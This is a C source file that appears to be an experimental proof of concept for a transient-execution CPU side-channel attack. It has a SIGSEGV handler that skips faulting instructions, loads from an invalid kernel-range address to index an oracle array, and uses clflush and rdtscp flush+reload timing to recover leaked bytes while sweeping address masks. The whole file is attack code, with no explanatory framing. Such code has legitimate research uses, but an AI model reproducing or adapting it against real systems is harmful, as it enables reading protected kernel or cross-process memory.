#include <stdlib.h>
#include <stdio.h>
#include <immintrin.h>
#include <sys/time.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#define __USE_GNU
#define _GNU_SOURCE

#include <sched.h>
#include <pthread.h>
#include <signal.h>
#include <ucontext.h>
#define PG_SIZE (4096U*16)
#define NUM_EXPR 1
#define NUM_ROUNDS 20
#define TENREP(a)     a;a;a;a;a;a;a;a;a;a
#define HUNDREDREP(a) TENREP(TENREP(a))
#define HUNDREDREP1(a) HUNDREDREP(HUNDREDREP(a))
#define CACHELSZ 64
#define PRIME_PREFETCH 457

unsigned short secret_val = 0xc0;
volatile char *oraclearr;
volatile unsigned *tmp_store;
volatile unsigned short* addr1;
volatile unsigned short* addr2;
volatile unsigned short* addr3;
int tlb_fd;
int shadow_offset[1024];
const int offset = 16;
int shadow_offset[1024];

uint64_t averg[65536];
int64_t averg_rnd[65536];


size_t memsize;
void* mem;

void tlb_flush_all(){
}

void* sibl_thread(void* a){
		while(1){
//			addr1[offset] = 0xf3;
		}
}


void evict_l1_cache(volatile void *addr){
		for(int i = 0; i < memsize; i += 4096){
			volatile char* ptr = (volatile char*)((((uint64_t)mem + i) & (~0xfff) | (uint64_t)addr & 0xfff));
			*ptr;*ptr;
		}
}

static inline void clflush(void* addr){
    // __asm__ __volatile__ ("\tclflush (%0)\n"::"r"(addr));
    asm volatile("\tclflush (%0)\n" : :"r"(addr) : "memory");
}


void flush_all(){
    for(int i = 0; i < 256; ++i){
        clflush((void*)oraclearr + PG_SIZE * i + i*CACHELSZ);
    }
}

void void_operations1(int64_t *a, int64_t *b);

static inline void memaccess(void* p){
    volatile char* addr = (volatile char*) p;
    *addr;
}

void __attribute__((optimize("-Os")))void_operations3(volatile char* a, volatile unsigned char* b){
    //addr1[offset ] = 0xf1; //  sender
    //asm volatile("mfence");
    //read(tlb_fd, addr1, 0x0);
    //addr1[offset+128] = 0xfc;
    // oraclearr[PG_SIZE * addr3[offset]];
    // lets populate full cache set with some trash
    
    for(int i = 0; i < 256; ++i){
    	addr3[offset+4096*i] = 0xc5;
    }
    asm volatile("mfence");
    for(int i = 0; i < 20; ++i)sched_yield(); // this thing should populate cache with something else
    oraclearr[PG_SIZE * addr3[offset]];
    oraclearr[PG_SIZE * addr3[offset]]; // 0xfa
    oraclearr[PG_SIZE * addr2[offset]]; // receiver; addr2 - not valid address
};

void void_operations2(int64_t *a, int64_t *b){
    while(*a > *b){
        *a -= *b;
    }
    if(b>a) void_operations1(b, a); 
    else void_operations3(oraclearr, addr2);
    return;
}

void void_operations1(int64_t *a, int64_t *b){
    while(*a > *b){
        *a -= *b;
    }

    if(b>a) void_operations2(b, a);
    else void_operations3(oraclearr, addr2);
    return;
}

int is_pointer_valid(void *p) {
    /* get the page size */
    size_t page_size = sysconf(_SC_PAGESIZE);
    /* find the address of the page that contains p */
    void *base = (void *)((((size_t)p) / page_size) * page_size);
    /* call msync, if it returns non-zero, return false */
    return msync(base, page_size, MS_ASYNC);
}

static unsigned long long rdtscp() {
	unsigned long long a, d;
	asm volatile ("rdtscp" : "=a" (a), "=d" (d));
	a = (d<<32) | a;
	return a;
}

uint64_t time_access(volatile void* add){
	uint64_t t1, t2;
	volatile char *f = (volatile char*)add;
	t1 = rdtscp();
	*f;	
	t2 = rdtscp();	
	return (t2 - t1);
}
//pwrite(tlb_fd, 0x0, 100, 0x0);

static void handler(int signum, siginfo_t *si, void* arg){
    ucontext_t *ucon = (ucontext_t*)arg;
    //printf("SIGHANDLER\n");
    // printf("SEGFAULT CODE LETS TEST FIRST BYTE %p\n", ucon->uc_mcontext.gregs[REG_RIP]);
    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 16;//17;
}


int  __attribute__((optimize("-O0")))main(int argc, char** argv){
    register char loaded_val;
    volatile char *f;
    int64_t a = 100000000,b = 100;
    void* addr2s;
    struct sigaction sa;
    int repeat = 0;
    unsigned short* shared_mem = ((char*)mmap(0x0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0x0) + 128);


    cpu_set_t my_set;
    sa.sa_handler = (void (*)(int))handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART; 
    if (sigaction(SIGSEGV, &sa, NULL) == -1) return -1;

    addr1 = (char*)(((uint64_t)malloc(20*PG_SIZE) + 4096) & ~0xFFF );
    addr3 = (char*)(((uint64_t)malloc(256*PG_SIZE) + 4096) & ~0xFFF );
    addr2 = (volatile char*)((((uint64_t)addr1) & 0xffffffffffffffff  | 0xffff000000000000 ) ); //(char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    addr2s = addr2;
    printf("addr1[%p] : addr2[%p]\n",addr1, addr2);
    addr1[offset] = 0xe3;
    asm volatile("mfence");
    clflush(&addr1[offset]);
    asm volatile("\tclflush (%0)\n" : :"r"(addr1) : "memory");
    asm volatile("\tclflush (%0)\n" : :"r"(&addr1) : "memory");
    tlb_fd = open("/dev/tlb_invalidator", O_RDONLY, 0x0);
    memsize = sysconf(_SC_PAGESIZE) * 1024;
    mem = (malloc(memsize));
    oraclearr = malloc(sizeof(char) * PG_SIZE*65537);
    tmp_store = malloc(sizeof(unsigned));
    addr3[offset] = 0xfa;
    pthread_t thread;
    uint64_t mask_c = 0x000000000; //0x0000;
//    pthread_create(&thread, NULL, sibl_thread, NULL);
    // EVERYTHING IS INITIALIZED
    if(!addr3){
    	printf("Not enough memory\n");
	exit(1);
    
    }
    if(!fork()){
//		CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
//		CPU_SET(1, &my_set);     /* set the bit that represents core 7. */
//		//sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
//
		while(1){
			addr1[offset] = *shared_mem;
		}
	
	}

    memset(oraclearr, 0xe0, sizeof(char) * PG_SIZE*65536);
experiments_:
    addr2 = (volatile char*)((uint64_t)addr2s ^ mask_c);
    //printf("Running experiments\n");
    memset(averg_rnd, 0x0, 256*sizeof(int64_t));
    memset(averg, 0x0, 256*sizeof(uint64_t));
//	CPU_ZERO(&my_set);       /* Initialize it all to 0, i.e. no CPUs selected. */
//	CPU_SET(1, &my_set);     /* set the bit that represents core 7. */
	//sched_setaffinity(0, sizeof(cpu_set_t), &my_set);

    for(int rnd_i = 0; rnd_i < NUM_ROUNDS; ++rnd_i){
        memset(averg, 0x0, 256*sizeof(uint64_t));
        for(int i = 0; i < NUM_EXPR; ++i){
            int flag = 0;
	    for(unsigned int j = 0; j < 256; ++j){	
                asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
            }
            
	    secret_val ^= 0x01; // toogle the last bit
	    *shared_mem = secret_val;
	    asm volatile("mfence");
	    void_operations1(&a, &b);

	    asm volatile("mfence");
            for(unsigned int j = 0; j < 256; ++j){	
                averg[j] += time_access((void*)(oraclearr + PG_SIZE * j));
            }
        }
        uint64_t min = (uint64_t)-1;
        int minid = -1;
        for(int rn = 0; rn < 256; ++rn){
            if((averg[rn]/NUM_EXPR) <= (min - 1) && rn != 0 && rn != addr3[offset]){
                min = averg[rn]/NUM_EXPR;
                minid = rn;
            }
        }
        ++averg_rnd[minid];
    }
    int winner;
    int64_t winner_max = -1;
    int64_t winner_min = 0xfffffffe;
    for(int i = 0; i < 256; ++i){
        if(averg_rnd[i] > winner_max){
            winner_max = averg_rnd[i];
            winner = i;
        }
        if(averg_rnd[i] < winner_min){
            winner_min = averg_rnd[i];
        }
	    //printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
    }
    if( (winner_max - winner_min) < (NUM_ROUNDS/3)) {
        //printf("Not egnough confidence\n");
        goto experiments_;
    }
    if( (averg_rnd[secret_val] >= 5 && (averg_rnd[secret_val] <= 14))){
    	printf("\nPOssible candidate [%p] of the mask %p, with weight %d; ptr valid %d\n", secret_val, mask_c, averg_rnd[secret_val], is_pointer_valid(addr2));
	repeat = 1;
    } else {
    	printf("\rtrying mask %p", mask_c);
    }
    if(repeat)
	mask_c -= 0x1000;
	    	
    //printf("\nWinner is 0x%02x [%c], weight - %d\n", winner, winner, averg_rnd[winner]);
    fflush(stdout);
    if(mask_c <= (0x1ULL << 63)){
	   mask_c += 0x1000;
	   goto experiments_;
    }
    printf("ADRESSES WERE [%p] vs [%p] : %p\n", &addr1[offset], &addr2[offset], 0xffff9a433f79b000);
    printf("Winner is 0x%02x [%c], weight - %d\n", winner, winner, averg_rnd[winner]);
    printf("MASK %p\n", mask_c);
    return 1;
}

//
//
